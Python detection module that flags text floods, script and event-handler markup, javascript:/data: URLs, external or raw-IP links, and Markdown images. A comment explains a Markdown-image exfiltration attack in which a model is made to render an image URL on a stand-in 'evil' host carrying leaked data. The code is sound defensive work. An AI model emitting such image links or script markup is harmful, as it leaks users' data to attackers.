"""Shape-of-the-text checks: flooding, markup that could execute or exfiltrate, unexpected links."""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass
from typing import Literal

Severity = Literal["high", "medium", "low"]

WORD = re.compile(r"\w+")
SAME_CHAR_RUN = re.compile(r"(.)\1{49,}")  # 50+ of the same character
SCRIPT = re.compile(
    r"<\s*/?\s*(?:script|iframe|object|embed|svg|style)\b|\bon(?:load|error|click|mouseover)\s*=", re.I
)
JS_URL = re.compile(r"\b(?:javascript|vbscript|data)\s*:", re.I)
MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(https?://[^)\s]+)")
URL = re.compile(r"\bhttps?://[^\s<>\"')\]]+", re.I)


@dataclass(frozen=True)
class Signal:
    id: str
    severity: Severity
    detail: str = ""


def repetition(text: str) -> Signal | None:
    if SAME_CHAR_RUN.search(text):
        return Signal("flood.char_run", "medium")
    words = WORD.findall(text.lower())
    if len(words) >= 40:
        top = max((words.count(w) for w in set(words)), default=0)
        if top / len(words) > 0.5 or len(set(words)) / len(words) < 0.1:
            return Signal("flood.repeated_words", "medium", f"{len(set(words))} distinct of {len(words)}")
    return None


def markup(text: str) -> list[Signal]:
    out: list[Signal] = []
    if SCRIPT.search(text):
        out.append(Signal("markup.script", "medium"))
    if JS_URL.search(text):
        out.append(Signal("markup.script_url", "medium"))
    if MD_IMAGE.search(text):
        # Markdown images are a classic exfiltration channel: the attacker gets the model to render
        # ![](https://evil/?data=...) and the client fetches it, leaking whatever is in the URL.
        out.append(Signal("markup.markdown_image", "medium"))
    return out


def _allowed(host: str, allowed: tuple[str, ...]) -> bool:
    host = host.lower().rstrip(".")
    return any(host == d or host.endswith("." + d) for d in allowed)


def links(text: str, allowed_domains: tuple[str, ...], max_links: int) -> list[Signal]:
    urls = URL.findall(text)
    if not urls:
        return []
    out: list[Signal] = []
    foreign = []
    for u in urls:
        try:
            host = urllib.parse.urlsplit(u).hostname or ""
        except ValueError:
            host = ""
        if not _allowed(host, allowed_domains):
            foreign.append(host)
            if re.fullmatch(r"[\d.]+|\[?[0-9a-f:]+\]?", host):
                out.append(Signal("links.raw_ip", "medium"))
    if foreign:
        out.append(Signal("links.external", "low", f"{len(foreign)} external"))
    if len(urls) > max_links:
        out.append(Signal("links.too_many", "medium", f"{len(urls)} links"))
    return out
